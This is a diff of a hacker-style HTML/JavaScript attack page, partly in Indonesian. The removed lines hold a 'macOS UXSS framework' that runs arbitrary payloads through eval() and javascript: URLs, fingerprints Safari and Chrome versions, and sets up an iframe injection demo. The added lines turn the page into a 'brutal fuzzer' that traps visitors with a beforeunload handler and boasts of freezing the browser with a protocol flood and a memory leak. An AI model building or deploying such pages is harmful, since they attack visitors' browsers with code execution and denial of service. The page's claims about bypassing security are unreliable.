-    // Attempt to inject via multiple vectors
-    try {
-        eval(payload);
-        addLog("✅ Payload executed in current context", "success");
-    } catch(e) {
-        addLog(`❌ Error: ${e.message}`, "");
-    }
-    
-    // Try via javascript: protocol
-    try {
-        window.open(`javascript:${encodeURIComponent(payload)}`, "_blank");
-    } catch(e) {}
-    
-    payloadHistory.push(payload);
-}
-
-// ============ DETECT MACOS VULNERABILITIES ============
-function detectMacVulnerabilities() {
-    addLog("🔍 Scanning macOS browser vulnerabilities...", "");
-    
-    const isMac = navigator.userAgent.includes('Mac');
-    const safariVersion = navigator.userAgent.match(/Version\/(\d+)/);
-    const chromeVersion = navigator.userAgent.match(/Chrome\/(\d+)/);
-    
-    if(isMac) {
-        addLog("✅ macOS detected - targeting Safari & Chrome", "success");
-        
-        if(safariVersion) {
-            const ver = parseInt(safariVersion[1]);
-            if(ver < 16) addLog("⚠️ Safari < 16: Beberapa UXSS belum di-patch", "info");
-            else addLog("✅ Safari up to date (no known public UXSS)", "");
-        }
-        
-        if(chromeVersion) {
-            const ver = parseInt(chromeVersion[1]);
-            if(ver < 110) addLog("⚠️ Chrome < 110: Possible older UXSS", "info");
-            else addLog("✅ Chrome up to date", "");
-        }
-        
-        // Check PDF viewer
-        const hasPDFPlugin = navigator.plugins && Array.from(navigator.plugins).some(p => p.name.includes('PDF'));
-        if(hasPDFPlugin) addLog("📄 PDF plugin detected - potential PDF UXSS vector", "info");
-        
-        // Check Safari WebExtension support
-        if(typeof safari !== 'undefined' && safari.extension) {
-            addLog("🧩 Safari extension API available - possible UXSS vector", "info");
-        }
-    }
-}
-
-// ============ DEMO CROSS-DOMAIN INJECTION ============
-function demoCrossDomainInjection() {
-    const targetDomain = prompt("Target domain untuk UXSS demo:", "https://www.google.com");
-    if(targetDomain) {
-        addLog(`🎯 Creating iframe to ${targetDomain} and attempting injection...`, "");
-        
-        const iframe = document.createElement('iframe');
-        iframe.src = targetDomain;
-        iframe.style.width = "800px";
-        iframe.style.height = "400px";
-        iframe.style.border = "2px solid #ff3b30";
-        document.body.appendChild(iframe);
-        
-        addLog("⚠️ CORS blocks direct access, but UXSS bypasses this", "");
-        addLog("💡 Real UXSS would inject code via browser vulnerability", "");
-        
-        setTimeout(() => {
-            iframe.remove();
-        }, 30000);
-    }
-}
-
-// Initialize
-detectMacVulnerabilities();
-addLog("🍎 VECTOR 16 - macOS UXSS Framework Loaded", "success");
-addLog("💀 Targeting: Safari WebKit, PDFKit, Chrome macOS, Extensions", "");
-addLog("⚠️ Gunakan di environment testing sendiri untuk research", "info");
-
-// Simpan state
-window.addEventListener('beforeunload', () => {
-    if(payloadHistory.length > 0) {
-        localStorage.setItem('uxss_payloads', JSON.stringify(payloadHistory));
+// Warning sebelum unload
+window.addEventListener('beforeunload', function(e) {
+    if (isRunning) {
+        e.preventDefault();
+        e.returnValue = "VECTOR 16 fuzzer sedang berjalan. Browser akan freeze.";
+        return "VECTOR 16 fuzzer sedang berjalan. Browser akan freeze.";
     }
 });
+
+// Initial logs
+addLog("💀 VECTOR 16 - PERMANENT BRUTAL FUZZER READY", "crash");
+addLog("⚠️ KLIK 'RUN PERMANENT FUZZER' - BROWSER AKAN FREEZE TOTAL", "crash");
+addLog("💀 TANPA SPAM WINDOW - MURNI PROTOCOL FLOOD + MEMORY LEAK", "crash");
 </script>
 </body>
 </html>
